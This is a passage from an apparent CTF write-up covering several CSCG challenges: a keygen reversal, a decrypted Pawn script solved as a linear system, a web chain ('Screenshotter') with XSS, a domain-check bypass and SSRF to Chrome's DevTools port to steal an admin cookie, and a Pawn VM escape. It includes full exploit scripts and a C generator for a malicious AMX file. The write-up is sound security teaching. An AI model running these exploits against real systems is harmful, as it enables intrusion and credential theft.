*pbVar6 = *pbVar6 ^ *(byte *)((int)&local_80 + (uint)abStack160[iVar2] % local_1438);
```
The program is performing a XOR operation and checks whether the result is `0` (i. e. both operands are equal).
Let's see where this happens in the assembly code:
```objdump
401379:       33 d2                   xor    %edx,%edx
40137b:       30 01                   xor    %al,(%ecx)     # <-- relevant instruction
40137d:       8a 09                   mov    (%ecx),%cl
40137f:       0f b6 44 24 0f          movzbl 0xf(%esp),%eax
401384:       84 c9                   test   %cl,%cl
```

In order to get the desired character, we simply have to read the register value of `%al` everytime the program hits that instruction.

With all that being said, we finally only have to put all the pieces together.
I'll use gdb for that.
There are probably many debuggers that can do the job equally well:

```bash
C:\Users\IEUser\Downloads>gdb KeyGen.exe
(gdb) break *0x401351
Breakpoint 1 at 0x401351
(gdb) commands
Type commands for breakpoint(s) 1, one per line.
End with a line saying just "end".
>silent
>printf "-"
>continue
>end
(gdb) break *0x40137b
Breakpoint 2 at 0x40137b
(gdb) commands
Type commands for breakpoint(s) 2, one per line.
End with a line saying just "end".
>silent
>printf "%c", $al
>continue
>end
(gdb) run
Starting program: C:\Users\IEUser\Downloads/KeyGen.exe
[New Thread 3432.0x6a0]
[New Thread 3432.0x1834]
[New Thread 3432.0x6b0]
Name: abc
Serial: whatever
M56KRT74-729LZUSP-FH5JKW1P-47W3QUYN0P3N0P3[New Thread 6360.0x1d80]
[Inferior 1 (process 6360) exited normally]
(gdb)
```

Note that we still have to strip the `N0P3`s. (It's not pretty, sue me!)
We can easily verify that the serial is indeed correct:
```bash
C:\Users\IEUser\Downloads>KeyGen.exe
Name: abc
Serial: M56KRT74-729LZUSP-FH5JKW1P-47W3QUY
C0RR3CT
```

#### Part II: The hard way

I will not go through all the details here but it is obviously also possible to reverse the generator and implement a standalone key generator.
The key thing to get right here is the algorithm that was implemented to generate the serial:
```c
  do {
    local_a4 = (local_a4 >> 0x1e ^ local_a4) * 0x6c078965 + uVar5;
    local_142c[uVar5] = local_a4;
    uVar5 = uVar5 + 1;
  } while (uVar5 < 0x270);
  local_1430 = 0x270;
  iVar7 = 0;
  do {
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + -4] = abStack160[iVar7 * 8 + -4] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + -3] = abStack160[iVar7 * 8 + -3] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + -2] = abStack160[iVar7 * 8 + -2] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + -1] = abStack160[iVar7 * 8 + -1] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8] = abStack160[iVar7 * 8] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + 1] = abStack160[iVar7 * 8 + 1] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + 2] = abStack160[iVar7 * 8 + 2] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    uVar5 = FUN_00401450(&local_1430);
    abStack160[iVar7 * 8 + 3] = abStack160[iVar7 * 8 + 3] ^ (&DAT_00403160)[(uVar5 % 0xff) * 4];
    iVar7 = iVar7 + 1;
  } while (iVar7 < 4);
```
After some not-so-transparent initialization logic the function `FUN_00401450` is repeatedly called possibly altering some state stored in `local_1430`.
Also, one might immediately notice that the loop is somewhat unrolled and proceeds for exactly 32 iterations.

If you are stuck here, a good advice is to search some of the constants. (Spoiler: `0x6c078965` will reveal what is going on right away.)

Anyway, second spoiler:
The key generator is implementing a Mersenne Twister RNG which is seeded using the first bytes of the entered name.
After that a lookup table is consulted using _randomly_ generated indices for each character in the input.
Eventually these _magic bytes_ are then converted into printable upper case ASCII characters using another lookup table.

Re-implementing the whole process, you may come up with a serial generator like this:
```cpp
#include <stdint.h>
#include <stdio.h>
#include <string.h>

unsigned char MAGIC_BYTES[255] = { '\x1d', '\x30', '\x9f', '\x37', '\xc7', '\xc3', '\x1e', '\xe8', '\x2f', '\xe6', '\x85', '\xcf', '\x4d', '\x52', '\x3f', '\xff', '\xf8', '\xea', '\x9f', '\x3d', '\x73', '\x70', '\xa5', '\x5a', '\xde', '\x3b', '\x39', '\xb3', '\x31', '\x39', '\xa8', '\x8f', '\xe7', '\x65', '\xff', '\xa4', '\x59', '\x61', '\xc0', '\x68', '\x1e', '\xaa', '\x2b', '\x0e', '\xb0', '\xf9', '\x03', '\xf5', '\xa0', '\xb8', '\xab', '\x76', '\x5f', '\x58', '\x57', '\xeb', '\xff', '\x7d', '\x00', '\x4b', '\xe6', '\xf3', '\xfc', '\xc6', '\xc4', '\xe5', '\xbd', '\xdc', '\x48', '\xb7', '\xc4', '\x5e', '\xd8', '\x2d', '\xfd', '\xa6', '\x77', '\xb1', '\xf4', '\xd6', '\xde', '\x49', '\x19', '\x2a', '\x43', '\xfd', '\x9a', '\xda', '\x07', '\x39', '\x6e', '\x57', '\x11', '\x41', '\x61', '\x39', '\x29', '\x35', '\x53', '\xdb', '\xc0', '\x17', '\x55', '\x68', '\x2d', '\xff', '\x9b', '\x21', '\x0c', '\x2f', '\x8d', '\xe3', '\x45', '\x04', '\xfa', '\xa0', '\x60', '\xf9', '\x43', '\xad', '\x5d', '\x2d', '\xc5', '\xea', '\xfd', '\x02', '\x0a', '\x4e', '\x7d', '\xcc', '\xa4', '\xb3', '\x73', '\x07', '\xab', '\xd8', '\x70', '\x6c', '\x58', '\xf5', '\x40', '\x5f', '\x51', '\xd3', '\xf5', '\x31', '\xdd', '\x64', '\xc2', '\xae', '\x9c', '\x36', '\x04', '\xe1', '\x0d', '\x58', '\x00', '\xe5', '\x53', '\x23', '\x14', '\xb0', '\xa7', '\xd8', '\x41', '\xdd', '\x5d', '\x3f', '\x65', '\x9b', '\x93', '\xc2', '\x4d', '\xf7', '\x85', '\x37', '\xb7', '\x32', '\x49', '\x9b', '\xb3', '\x97', '\x4a', '\x1a', '\x36', '\x40', '\xd6', '\x02', '\xcc', '\x79', '\x4c', '\x48', '\xe3', '\x3f', '\x00', '\xe3', '\xd1', '\xaf', '\x48', '\x65', '\x51', '\x9a', '\xf7', '\x42', '\x7d', '\x15', '\xf3', '\x7d', '\x05', '\x0b', '\xfb', '\x76', '\x4c', '\xe8', '\xe3', '\xfe', '\x57', '\xea', '\x11', '\x61', '\xa9', '\x39', '\x26', '\x54', '\x9f', '\x30', '\x57', '\xa5', '\xd4', '\x9d', '\xc4', '\x20', '\x96', '\x82', '\xd6', '\xe0', '\x8f', '\x5c', '\x73', '\x32', '\x27', '\xac', '\x8c', '\x9d', '\x58', '\xe9', '\x3d', '\xb4', '\x30', '\xf8', '\x1e', '\x0f', '\x81', '\xd4' };
char ALL_CHARACTERS[] = "ABCDEFGHJKLMNPQRSTUWQYZ0123456789!";


uint32_t mt_state[624];
uint32_t mt_index;

void init(uint32_t seed) {
    mt_index = 0;
    mt_state[0] = seed;

    for (int i = 1; i < 624; i++) {
        mt_state[i] = (0x6c078965 * (mt_state[i - 1] ^ (mt_state[i - 1] >> 30)) + i);
        mt_state[i] &= 0xFFFFFFFF;
    }
}

void generate(void) {
    for (int i = 0; i < 624; i++) {
        uint32_t v = (mt_state[i] & 0x80000000) + (mt_state[(i + 1) % 624] & 0x7fffffff);
        mt_state[i] = mt_state[(i + 397) % 624] ^ (v >> 1);

        if (v % 2)
            mt_state[i] ^= 0x9908b0df;
    }
}

uint32_t next(void) {
    if (mt_index == 0)
        generate();

    uint32_t v = mt_state[mt_index];
    v ^= (v >> 11);
    v ^= ((v << 7) & 0x9D2C5680);
    v ^= ((v << 15) & 0xEFC60000);
    v ^= (v >> 18);

    mt_index = (mt_index + 1) % 624;

    return v;
}


int main() {
    const int MAX_LEN = 0x20;
    char name[0x20 + 1] = {};
    unsigned char randomized[0x20 + 1] = {};
    char serial[0x20 + 3 + 1] = {};
    printf("Name: ");
    scanf("%32s", name);
    size_t len = strlen(name);
    for (int i = 0; i + len < sizeof(name); ++i) {
        name[i + len] = name[i];
    }
    init(((uint32_t*)name)[0]);
    for (int i = 0; i < MAX_LEN; ++i) {
        const uint32_t index = next();
        randomized[i] = MAGIC_BYTES[index % 0xFF] ^ (unsigned char)name[i];
    }

    int j = 0;
    for (int i = 0; i < MAX_LEN; ++i) {
        if (i % 8 == 0 && i > 0) {
            serial[j++] = '-';
        }
        const unsigned char index = randomized[MAX_LEN - i - 1];
        serial[j++] = ALL_CHARACTERS[index % 33];
    }
    printf("Serial: %s\n", serial);
}
```

<a name="en-pawn">

### En-Pawnsant

Another reversing challenge easing the way into the upcoming [Pawn](https://github.com/compuphase/pawn) challenges. You were given an encrypted pawn script which essentially checked whether your input matched the flag.

#### Step I: Decrypting the script

In order to execute the script you need to decrypt it first. If you scim the source code of the [pawn-compiler](https://github.com/compuphase/pawn/blob/master/compiler/sc6.c#L196) you will find that it uses a [KeeLoq](https://en.wikipedia.org/wiki/KeeLoq) cipher to encrypt all blocks written to the binary.

The challenge description states a hint about the key used:
```make
PAWN := $(shell hexdump -n 4 -e '4/4 "%08X" 1 "\n"' /dev/random)
all:
    ./pawncc -k$(PAWN) crackme.p
```
Essentially it comes down to a 4-byte key, still an issue if the cipher is implemented correctly.
But, if you study the the cipher more closely it states that the IV is to be updated after each encryption.
Good thing the pawn authors happily ignored that portion so we are simply dealing with a 32-bit key brute force.

That's pretty reasonable. We just have to find a known plain text somewhere within the compiled script.
It turns out that the pawn-compiler likes to place the same pawn-instructions at the start of each binary.
With this, and the already implemented [encryption / decryption routines](https://github.com/compuphase/pawn/blob/master/amx/keeloq.c), we can easily assemble a brute force script which gets us the key `0x3199e32b` in no time.
Sidenote: I remember fiddling quite a bit with endianess, so if your key looks different, this may be a reason.

#### Step II: Making sense of that shit

If you run the decrypted script using `pawnrun` it gladly messes up you terminal line buffering. Thanks for nothing.
Anyway you can disassemble the script using `pawndisasm`.
I actually spent quite a bit of time reading through the disassembly trying to understand it.
The program does two things:
It first encodes your input using a simple ROT-X cipher, ignoring characters other than letters.
Eventually the input is split into 10 four-byte chunks and each byte is ORed `0x80`.
After that it checks whether the resulting vector satisfies a linear system of equations MOD 2^32.

I extracted the matrix by patching the `pawn-interpreter` making it output all the memory accesses during the final step:
```diff
diff --git a/amx/amx.c b/amx/amx.c
index 9e4491a..c6a9b1a 100644
--- a/amx/amx.c
+++ b/amx/amx.c
@@ -2273,6 +2273,8 @@ int AMXAPI amx_Exec(AMX *amx, cell *retval, int index)
   hea=amx->hea;
   stk=amx->stk;

+    FILE *tmp;
+
   /* start running */
   for ( ;; ) {
     op=_RCODE();
@@ -2310,7 +2312,12 @@ int AMXAPI amx_Exec(AMX *amx, cell *retval, int index)
       /* verify address */
       if (pri>=hea && pri<stk || (ucell)pri>=(ucell)amx->stp)
         ABORT(amx,AMX_ERR_MEMACCESS);
       pri=_R(data,pri);
+      if ((cell)((unsigned char *)cip-amx->code) - 4 == 0x2218) {
+        tmp = fopen("runlog.txt", "a");
+        fprintf(tmp, "@%08X -> %08X\n", (cell)((unsigned char *)cip-amx->code) - 4, pri);
+        fclose(tmp);
+      }
       break;
     case OP_LODB_I:
       GETPARAM(offs);
@@ -2535,6 +2575,11 @@ int AMXAPI amx_Exec(AMX *amx, cell *retval, int index)
       alt<<=offs;
       break;
     case OP_SMUL:
+      if ((cell)((unsigned char *)cip-amx->code) - 4 == 0x224c) {
+        tmp = fopen("runlog.txt", "a");
+        fprintf(tmp, "%08x = p * a = %08x * %08x\n", pri * alt, pri, alt);
+        fclose(tmp);
+      }
       pri*=alt;
       break;
     case OP_SDIV:
@@ -2559,6 +2604,11 @@ int AMXAPI amx_Exec(AMX *amx, cell *retval, int index)
       } /* if */
       break;
     case OP_ADD:
+      if ((cell)((unsigned char *)cip-amx->code) - 4 == 0x2254) {
+        tmp = fopen("runlog.txt", "a");
+        fprintf(tmp, "%08x = p + a = %08x + %08x\n", pri + alt, pri, alt);
+        fclose(tmp);
+      }
       pri+=alt;
       break;
     case OP_SUB:
@@ -2586,7 +2636,14 @@ int AMXAPI amx_Exec(AMX *amx, cell *retval, int index)
       pri= pri==alt ? 1 : 0;
       break;
     case OP_NEQ:
+      if ((cell)((unsigned char *)cip-amx->code) - 4 == 0x22b4) {
+        tmp = fopen("runlog.txt", "a");
+        fprintf(tmp, "p != a : %08x != %08x\n", pri, alt);
+        fclose(tmp);
+        pri = 0;
+      } else {
       pri= pri!=alt ? 1 : 0;
+      }
       break;
     case OP_SLESS:
       pri= pri<alt ? 1 : 0;
```

Notice that I also patched out the final comparisons to match because otherwise the script would stop after the first missmatch.
Working through the dump we can assemble the matrix and solve for the correct input using f. e. the following sage-script:
```python
import string

l1 = [ 0x94744E61, 0x125479D7, 0x090E4237, 0x9BFAE5DE, 0x1FF84545, 0xF9C58786, 0x21E66D6F, 0xF20D372D, 0x81498FEC, 0xF2390829]
l2 = [ 0xC8B06953, 0x063CA3E7, 0xB32BB405 ,0x4CA9BB0D ,0xA67AC8DE ,0xF6B26DAB ,0x124D088C ,0xF0953EA7 ,0x16FA720F ,0x7A8E5021]
l3 = [ 0x06015119 ,0xE484B1B8 ,0xBA3A00B2 ,0x1D6D006E ,0xE60E982D ,0x2DECD163 ,0x07BFD2ED ,0x2C1238E2 ,0xC722D0FC ,0x46BF93CE]
l4 = [ 0x6CA8B34C ,0x416B17F2 ,0x2D04A01D ,0xA82FED6A ,0xC1F6D9F3 ,0x3902D48C ,0xFE01EC39 ,0x977BC209 ,0xF846D0E8 ,0xEC31F6C9]
l5 = [ 0xDF2A217A ,0xAE797965 ,0x42BDDDCE ,0x6B2B4D89 ,0xA750110F ,0x85920329 ,0x1CF4EE68 ,0x91A34367 ,0x90E214CE ,0x44F5F39B]
l6 = [ 0x5347AFBC ,0x74EA75CA ,0xC700ADB8 ,0xBC96286F ,0x4EA50DA8 ,0x1EB72889 ,0x61FA876F ,0x7F6950BA ,0xF3CCBED7 ,0xFD3D2731]
l7 = [ 0xAF2C0924 ,0x6C8E67B8 ,0xCD1A9E68 ,0xC4632C1A ,0xF3F175CC ,0x24204DE5 ,0xDB219BE7 ,0xB884CE78 ,0x0C85005E ,0x403A74AC]
l8 = [ 0xF50FB69B ,0xA6ED57AA ,0x23377A8B ,0x230A2B66 ,0x3D187EE6 ,0xF260BF6C ,0xA7015D60 ,0x09022B54 ,0xA9E2D20A ,0x79779ACF]
l9 = [ 0xFEA8C7DF ,0x0B03F143 ,0xABB2FB1A ,0xCEE7FA94 ,0x2D2C9EAE ,0x8197A7A4 ,0xEEF3E5EB ,0x5BCBA041 ,0x5CB3A775 ,0x339A3B5F]
la = [ 0xABCDD0ED ,0x07EB3DAA ,0xE23DAC80 ,0xA6D480E9 ,0xF6E56EC8 ,0x2A53C55D ,0x6957629C ,0x0C334B38 ,0x5C797721 ,0x193F0920]

M = [l1, l2, l3, l4, l5, l6, l7, l8, l9, la ]

F = Zmod(2^32)

y = [
    0x89d933dc,
    0xaa62006e,
    0x9063e5fe,
    0xbd44d0bd,
    0x59bcc569,
    0xc3d2eebc,
    0x21aaa73c,
    0xc83f1e35,
    0x6c7394fd,
    0x9f07e4fe,
]

y = vector(F, y)
M = Matrix(F, M)

x = M.solve_right(y)

def transform(c):
    if c.islower():
        return chr((ord(c) - 97 + 1337) % 26 + 97)
    elif c.isupper():
        return chr((ord(c) - 65 + 1337) % 26 + 65)
    else:
        return c

def solve_for_chr(words):
    for w in map(int, words):
        chars = []
        for i in range(4):
            b = (w >> (i * 8)) & 0xFF
            for c in string.printable:
                if (ord(transform(c)) | 0x80) == (b | 0x80):
                    chars.append(c)
                    break
            else:
                chars.append('?')
        print(''.join(chars))

print(solve_for_chr(x))
```

<a name="screenshotter">

### Screenshotter

Screenshotter .. what an adventure! Pretty cool web challenge requiring you to chain quite a few steps together.

TL;DR: Find an XSS vulnerability in the page. Find a domain filter bypass. Using the screenshot functionality, exfiltrate the id of an open tab used by the admin visible via the exposed debugging functionality of Chrome. Craft a web page which performs a SSRF to the local Chrome debugger via WebSockets and redirect the admin to a page which places the XSS payload on the admin's _homepage_. Exfiltrate the flag / cookies using the XSS payload.

I recommend you getting an overview of the [sources](screenshotter/challenge_files/screenshotter.zip) before continuing.

At a high level we are given the source of a Flask web application where you can upload notes and take screenshots of web pages.
Furthermore there is a simulated admin user which adds a note with the flag and then continues to request screenshots of `https://cscg.de`, eventually deleting them and starting all over again.
The screenshots are processed using a headless Chrome browser which is available on the local network and is communicated with using [Chrome's debugging API](https://chromedevtools.github.io/devtools-protocol/).
To make things a little harder, screenshots are limited to `cscg.de`.

Looking through the backend source, it seems pretty solid, there is no apparent way of getting into the admins account.
I went on looking through the page source and eventually found a XSS vulnerability in the `notes.html` template:
```html
<div class="col-span-3 row-span-4 p-1 m-1">
    {% if note.data.startswith('data:image/') %}
        <img src="{{ note.data }}" class="rounded-t-xl object-cover h-full w-full" alt={{ note.title }} />
    {% else %}
        <pre class="bg-gray-50 rounded-t-xl w-full p-2 text-sm">{{ note.body }}</pre>
    {% endif %}
</div>
```

Even though Jinja2 will escape common HTML payloads, it will not sanitize attributes well enough, thus allowing us to inject a JavaScript payload using `note.title`.
A payload could look like this: `a onload=alert(1)`

We have to control the title though and it has to be an image.
This turns out to be a little hard.
If we request a screenshot, the title will be set to the title of page requested.
However since the domains are checked to be on `cscg.de` we cannot control the title.

At this point we ought to discover the second vulnerability:
```python
# ...

@app.route('/add_note', methods=['POST'])
@login_required
def add_note():
    new_note_uuid = uuid.uuid4().hex
    user = g.user['uuid']
    title = request.form['title']
    body = request.form['body']
    data = ''

    if body.startswith('https://www.cscg.de') or body.startswith('http://cscg.de'):

        # continue with screenshot...
```

The problem here is that the domains are checked incorrectly, allowing one to request a screenshot of for example `http://cscg.defgh.abc.de`.

Step I done. We have a controllable XSS on the page, though we somehow have to make the admin go to our page at `http://cscg.defgh.abc.de`.
How can we do that?

This is where the headless Chrome comes into play.
Since it is already controlled via the DevTools API, maybe we can leverage that aswell?

Short answer: Yes we can!
Redirecting an open tab to another page is as easy as
```javascript
let ws = new WebSocket("ws://127.0.0.1:9222/devtools/page/{{ target }}");
ws.onopen = () => {
    ws.send(JSON.stringify({
        id: 1,
        method: "Page.navigate",
        params: {
            url: "http://cscg.defgh.abc.de/xsspayload",
            referrer: ""
        }
    }));
};
```
.. where `target` has to be the id of the tab we would like to redirect.

Problem is, we do not know the id!
In order to get the id we can grab a list of open tabs issuing a GET request to `http://127.0.0.1:9222/json/list`.
That's easy, right?
Actually not, because CORS prevents us from reading the results (we will have to issue that request via javascript on the local network).
Good thing we have our over-engineered CORS bypass already at hand: A screenshot.
If we redirect a page we requested a screenshot from to `http://127.0.0.1:9222/json/list` we can exfiltrate the id from the image!
After a little bit of googling around I found [Tesseract](https://github.com/tesseract-ocr/tesseract) which does a pretty good job at this.
As a bonus, there is a pre-built docker image we can use to spare the hassle of installing.

With the id available, we can issue another screenshot request which is then able to redirect the admin to our malicious page.
Really the only problem left now is timing!
All of the steps mentioned above have to be completed within a single request of the admin, leaving us 10 seconds to do all of it.

A little bit of crafting here and there, may result in a solution like this (also take a look at the server code in [screenshotter/](screenshotter/)):

```python
import os
import subprocess
import base64
import time
import re

import requests


def parse_img(filename):
    args = ["docker", "run", "-it", "-v", f"{os.getcwd()}:/home/work", "tesseractshadow/tesseract4re", "tesseract", filename, "tmp_output"]
    print(" ".join(args))
    subprocess.run(args)

    matches = []

    with open("tmp_output.txt", "r") as f:
        for line in f:
            m = re.search(r"/page/([A-Z0-9]{32})", line)
            if m:
                print("PARSED", line)
                matches.append(m.group(1))

    print("using", matches[0])
    return matches[0]


session = requests.Session()

url = "http://127.0.0.1:1024"
# url = "https://deadbeefdeadbeefdeadbeef-screenshotter.challenge.broker.cscg.live:31337"
cscg_sub = "http://cscg.defgh.yourdomain.org"


print("Waiting for signal..")
while True:
    resp = requests.get(url + "/activity")
    m = re.search(r'<div class="p-2">(.*?)</div>', resp.text, re.M | re.DOTALL)
    if "flagger deleted a note" in m.group(1) and "second" in m.group(1):
        break
    else:
        time.sleep(1)

print("Logging in...")

data = dict(username="abc", password="abc")
session.post(url + "/registerlogin", data=data)

time.sleep(36 - 6.5)

print("Getting list of open tabs...")
data = dict(body=cscg_sub + "/step1", title="")
session.post(url + "/add_note", data=data)

for _ in range(15):
    resp = session.get(url + "/notes")
    if "processing screenshot..." not in resp.text:
        print("Got it!")
        m = re.search(r'src="data:image/png;base64,([^"]*)"', resp.text)
        img = base64.b64decode(m.group(1))
        with open("screenshot.png", "wb") as f:
            f.write(img)
        break
    else:
        print("waiting for screen...")
        time.sleep(1)
else:
    print("ERR: Could not find screenshot")
    exit(1)

print("Changing page of admin..")
id = parse_img("screenshot.png")
data = dict(body=f"{cscg_sub}/step2/{id}", title="")
session.post(url + "/add_note", data=data)

for _ in range(15):
    resp = session.get(url + "/notes")
    if "processing screenshot..." not in resp.text:
        print("Got it!")
        m = re.search(r'src="data:image/png;base64,([^"]*)"', resp.text)
        img = base64.b64decode(m.group(1))
        with open("screenshot2.png", "wb") as f:
            f.write(img)
        break
    else:
        print("waiting for screen...")
        time.sleep(1)

print("DONE.")
```

Using the sources provided, you should receive a request leaking the cookie.
With that cookie you can login as the admin and view the flag.

<a name="pwn_pawn">

### P(A)WN

Long story short:
- skim through the operands to find some that are neither checked statically nor dynamically
- find one which lets you jump into the "data" section
- use this to add instructions which would be checked statically, but are not because they are deemed un-reachable
- abuse the indirect call to native library code issued by SYSREQ to jump to a one-gadget

```cpp
#include "stdio.h"
#include "stdlib.h"
#include "stdint.h"
#include "cassert.h"

typedef struct tagAMX_HEADER {
  int32_t size;             /* size of the "file" */
  uint16_t magic;           /* signature */
  char    file_version;     /* file format version */
  char    amx_version;      /* required version of the AMX */
  int16_t flags;
  int16_t defsize;          /* size of a definition record */
  int32_t cod;              /* initial value of COD - code block */
  int32_t dat;              /* initial value of DAT - data block */
  int32_t hea;              /* initial value of HEA - start of the heap */
  int32_t stp;              /* initial value of STP - stack top */
  int32_t cip;              /* initial value of CIP - the instruction pointer */
  int32_t publics;          /* offset to the "public functions" table */
  int32_t natives;          /* offset to the "native functions" table */
  int32_t libraries;        /* offset to the table of libraries */
  int32_t pubvars;          /* offset to the "public variables" table */
  int32_t tags;             /* offset to the "public tagnames" table */
  int32_t nametable;        /* offset to the name table */
  int32_t overlays;         /* offset to the overlay table */
} __attribute__((packed)) AMX_HEADER;

    /*
    OP_STOR:
      GETPARAM(offs);
      _W(data,offs,pri);
    */

    /*
    OP_CONST_PRI:
      GETPARAM(pri);
    */

    /*
    OP_LOAD_PRI:
      GETPARAM(offs);
      pri=_R(data,offs);
    */

    /*
    OP_SYSREQ:
      GETPARAM(offs);
      amx->cip=(cell)((unsigned char *)cip-amx->code);
      amx->hea=hea;
      amx->frm=frm;
      amx->stk=stk;
      i=amx->callback(amx,offs,&pri,(cell *)(data+(int)stk));
      if (i!=AMX_ERR_NONE) {
        if (i==AMX_ERR_SLEEP) {
          amx->pri=pri;
          amx->alt=alt;
          amx->reset_stk=reset_stk;
          amx->reset_hea=reset_hea;
          return i;
        }
        ABORT(amx,i);
      }
    */

    /*
    OP_SWAP_PRI:
      offs=_R(data,stk);
      _W32(data,stk,pri);
      pri=offs;
    */

    /*
    OP_PUSH:
      GETPARAM(offs);
      PUSH(_R(data,offs));
    */

    /*
    OP_SCTRL:
      GETPARAM(offs);
      switch ((int)offs) {
      case 0:
      case 1:
      case 3:
        break;
      case 2:
        hea=pri;
        break;
      case 4:
        stk=pri;
        break;
      case 5:
        frm=pri;
        break;
      case 6:
        cip=(cell *)(amx->code + (int)pri);
        break;
      }
    */

int main(int argc, char** argv) {
    FILE* fp = fopen(argv[1], "wb");
    if (!fp) {
        perror("fopen");
        return -2;
    }

    AMX_HEADER *hdr;
    size_t n = sizeof(AMX_HEADER);
    unsigned char buf[1024] = {};

    hdr = (AMX_HEADER*)buf;

    hdr->size = 332;
    hdr->magic = 61920;
    hdr->file_version = 11;
    hdr->amx_version = 11;
    hdr->flags = 0;
    hdr->defsize = 8;
    hdr->cod = 108;
    hdr->dat = 324;
    hdr->hea = 332;
    hdr->stp = 16716;
    hdr->cip = 0;
    hdr->publics = 60;
    hdr->natives = 60;
    hdr->libraries = 68;
    hdr->pubvars = 84;
    hdr->tags = 84;
    hdr->nametable = 84;
    hdr->overlays = 84;

    // Layout: <hdr> <other stuff> |cod| <code> |dat| <data> |hea| <start of heap>

    #define OP_NOP 0
    #define OP_LOAD_PRI 1
    #define OP_STOR 13
    #define OP_CONST_PRI 9
    #define OP_ADD_C 100
    #define OP_SCTRL 20
    #define OP_SYSREQ 69

    #define _NEXT(x) *((int32_t*)(buf + n)) = x; n += sizeof(int32_t)

    #define NOP() _NEXT(OP_NOP)

    #define LOAD(off) { _NEXT(OP_LOAD_PRI); _NEXT(off); }
    #define STORE(off) { _NEXT(OP_STOR); _NEXT(off); }

    #define LOAD_C(c) { _NEXT(OP_CONST_PRI); _NEXT(c); }
    #define ADD_C(c) { _NEXT(OP_ADD_C); _NEXT(c); }

    #define PUSH() { _NEXT(OP_PUSH); _NEXT(0); _NEXT(OP_SWAP_PRI); }

    #define SYSREQ(off) { _NEXT(OP_SYSREQ); _NEXT(off); }

    #define JMP_OOB(distance) { LOAD_C(distance); _NEXT(OP_SCTRL); _NEXT((uint32_t)6); }

    hdr->publics = hdr->natives = n;

    // address has to be non-zero in order to avoid name check in amx_Register (amx.c:1930)
    _NEXT((uint32_t)0xDEADBEEF);
    _NEXT((uint32_t)0xDEADBEEF);

    // make sure we "have" a native library entry
    hdr->libraries = hdr->pubvars = hdr->tags = hdr->nametable = hdr->overlays = n;

    _NEXT((uint32_t)0x0);

    hdr->cod = n;

    NOP();

    // jump into data segment in order to skip verification of our code.
    int32_t distance_to_data = 20;
    JMP_OOB(distance_to_data);

    hdr->dat = n;

    // -- This is actually not needed whoops. (we keep it because we do not want to do alignment again.)
    int32_t fake_func_stub_addr = 128;
    // leak heap pointer into pri
    LOAD(-0x1214);

    int32_t leak_to_data = 0x11bc;
    ADD_C(leak_to_data + fake_func_stub_addr);

    int32_t natives_offset = -0x20;
    STORE(natives_offset);

    LOAD(-0x1214 + 4);
    STORE(natives_offset + 4);
    // -- This is actually not needed whoops.

    // load a libc leak into pri
    LOAD(-0x1064);

    int32_t gadget;
    /* libc.2.32 */
    // gadget = 0xdf552;
    // gadget = 0xdf54f;
    // gadget = 0xdf54c;

    /* libc.2.27 */
    gadget = 0xe561e;
    // gadget = 0x4f3d5;
    // gadget = 0x4f432;
    // gadget = 0x10a41c;

    int32_t diff_to_libc = (int32_t)(0x00007f8a398f0ca0 - 0x7f8a39505000);
    ADD_C(-diff_to_libc + gadget);

    STORE(natives_offset);

    LOAD(-0x1064 + 4);
    STORE(natives_offset + 4);

    SYSREQ(0);

    // Some dummy data
    _NEXT(0xAAAAAAAA);

    hdr->size = n;
    hdr->hea = hdr->size;
    hdr->stp = hdr->hea + 128;

    printf("hdr->size = %d;\n", hdr->size);
    printf("hdr->magic = %u;\n", hdr->magic);
    printf("hdr->file_version = %d;\n", (int)hdr->file_version);
    printf("hdr->amx_version = %d;\n", (int)hdr->amx_version);
    printf("hdr->flags = %d;\n", hdr->flags);
    printf("hdr->defsize = %d;\n", hdr->defsize);
    printf("hdr->cod = %d;\n", hdr->cod);
    printf("hdr->dat = %d;\n", hdr->dat);
    printf("hdr->hea = %d;\n", hdr->hea);
    printf("hdr->stp = %d;\n", hdr->stp);
    printf("hdr->cip = %d;\n", hdr->cip);
    printf("hdr->publics = %d;\n", hdr->publics);
    printf("hdr->natives = %d;\n", hdr->natives);
    printf("hdr->libraries = %d;\n", hdr->libraries);
    printf("hdr->pubvars = %d;\n", hdr->pubvars);
    printf("hdr->tags = %d;\n", hdr->tags);
    printf("hdr->nametable = %d;\n", hdr->nametable);
    printf("hdr->overlays = %d;\n", hdr->overlays);

    assert(hdr->size == hdr->hea);

    if (fwrite((unsigned char*)buf, 1, n, fp) != n) {
        perror("fwrite");
        return -2;
    }

    return 0;
}
```

<a name="caaks">

### Calculator As A Kernel Service

Finally a kernel exploit!
Just kidding, a deliberately vulnerable driver it is.
As a bonus, we are working our way towards Windows, exciting!
(Actually ReactOS, but you know ..)

The challenge consists of a service, which we will talk to. This service in turn communicates with the _CSCG-driver_, performing some insane maths in the kernel ;)
We are given the source code of the service, however we have to reverse the driver ourselves.

As a nice gesture of the author, we are also given a debug image so we can get set up our lab environment pretty quickly.
I will be using linux + qemu + gdb as the toolchain of choice.

Let's start by examining the service.
```txt
Welcome to CAAKS (Calculator as a Kernel Service)
Full speed, optimized, raw memory calculations in the kernel!
(Allright, i lied. I have no clue what I'm doing
I just wanted to get into windows kernel programming
and i learn best by coding calucator applications)

Anyway: I think its secure!

Menu:
1. Do calculation via IOCTL
2. Allocate RWX Memory (¯_(ツ)_/¯)
3. Exit
```

Our interactions are quite simple, we can either do a calculation using the driver or allocate an RWX page.
We will keep off the RWX page for the exploit, so we can ignore this option right now.

Looking through the code for the first option, we can take note of a few things.
First we are allowed to allocate (and send) a buffer of up to `0x10000` bytes:
```cpp
// Get length of the IOCTL in buffer
send_formatted_string(socket, (char*)recvbuf, sizeof(recvbuf), (char*)"Input buffer length:\n");
IOCTL_in_buffer_len = recv_int(socket);
if (IOCTL_in_buffer_len < 0 || IOCTL_in_buffer_len > 0x10000) {
